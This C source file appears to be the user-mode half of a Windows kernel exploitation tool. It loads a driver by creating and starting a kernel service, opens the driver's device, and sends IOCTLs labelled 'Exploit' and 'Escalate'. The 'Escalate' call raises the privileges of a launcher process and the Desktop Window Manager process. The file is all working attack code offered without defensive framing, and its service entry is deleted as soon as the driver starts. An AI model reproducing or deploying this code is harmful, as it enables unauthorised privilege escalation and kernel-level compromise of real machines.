#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32")

extern DWORD gIoctlEscalate;
extern DWORD gIoctlExploit;

BOOL 
Exploit(HANDLE device, DWORD hostId) {
	DWORD isExploited = FALSE;
	DWORD bytesReturned = 0;

	BOOL status = DeviceIoControl(device, gIoctlExploit, &hostId, sizeof(DWORD),
		&isExploited, sizeof(DWORD), &bytesReturned, NULL);

	if (!status || bytesReturned != sizeof(DWORD)) {
		printf(
			"[-] Failed to exploit. See kernel debugger output for more information. "
			"Status: %d. Bytes returned: %d. Error: 0x%08X",
			status, bytesReturned, GetLastError());
		return FALSE;
	}

	if (!isExploited) {
		printf("[-] Failed to exploit. See kernel debugger output for more information\n");
		return FALSE;
	}

	return TRUE;
}

BOOL
Escalate(HANDLE device, DWORD launcherPid, DWORD dwmPid) {
	DWORD pidsToEscalate[2];
	pidsToEscalate[0] = launcherPid;
	pidsToEscalate[1] = dwmPid;

	DWORD isEscalated = FALSE;
	DWORD bytesReturned = 0;

	BOOL status = DeviceIoControl(device, gIoctlEscalate, pidsToEscalate, sizeof(DWORD) * 2, 
		&isEscalated, sizeof(DWORD), &bytesReturned, NULL);

	if (!status || bytesReturned != sizeof(DWORD)) {
		printf(
			"[-] Failed to escalate privileges. See kernel debugger output for more information. "
			"Status: %d. Bytes returned: %d. Error: 0x%08X",
			status, bytesReturned, GetLastError());
		return FALSE;
	}

	if (!isEscalated) {
		printf("[-] Failed to escalate privileges. See kernel debugger output for more information\n");
		return FALSE;
	}

	return TRUE;
}

VOID
CloseDevice(HANDLE device) {
	CloseHandle(device);
}

HANDLE
OpenDevice(PCHAR name) {
	HANDLE device = CreateFile(
		name, 
		GENERIC_READ, 
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if (device == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open the device. Error: 0x%08X\n", GetLastError());
		return NULL;
	}

	return device;
}

BOOL 
LoadDriver(PCHAR path) {
	CHAR driverPath[MAX_PATH];
	PCHAR driverName = NULL;
	CHAR serviceName[MAX_PATH];
	size_t serviceNameLen = 0;
	PCHAR displayName = serviceName;
	SC_HANDLE scManager = NULL;
	SC_HANDLE service = NULL;

	scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!scManager) {
		printf_s("[-] Failed to open SCM");
		return FALSE;
	}

	GetFullPathNameA(path, MAX_PATH, driverPath, &driverName);
	strcpy_s(serviceName, MAX_PATH, driverName);

	// Remove ".sys" from name
	serviceNameLen = strlen(serviceName);
	if (serviceNameLen >= 4 && serviceName[serviceNameLen - 4] == '.') {
		serviceName[serviceNameLen - 4] = '\0';
	}

	service = CreateServiceA(scManager, serviceName, displayName, SERVICE_START + DELETE, SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL);
	if (!service) {
		printf_s("[-] Failed to create the service. Error: 0x%08X\n", GetLastError());
		CloseServiceHandle(scManager);
		return FALSE;
	}

	if (StartService(service, 0, NULL) == FALSE) {
		printf_s("[-] Failed to start the service. Error: 0x%08X\n", GetLastError());
		DeleteService(service);
		CloseServiceHandle(service);
		CloseServiceHandle(scManager);
		return FALSE;
	}

	DeleteService(service);
	CloseServiceHandle(service);
	CloseServiceHandle(scManager);
	return TRUE;
}